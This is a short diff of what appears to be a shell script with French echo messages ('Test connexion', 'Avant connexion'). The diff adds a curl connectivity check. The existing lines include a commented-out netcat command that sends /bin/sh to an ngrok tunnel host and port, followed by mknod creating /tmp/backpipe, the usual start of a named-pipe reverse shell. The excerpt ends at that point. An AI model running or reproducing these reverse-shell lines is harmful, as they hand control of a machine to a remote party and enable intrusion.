@@ -1,3 +1,7 @@
+echo "Test connexion"
+
+curl google.fr
+
 echo "Avant connexion"
 # x=$(nc -e /bin/sh 0.tcp.eu.ngrok.io 14165)
 mknod /tmp/backpipe p
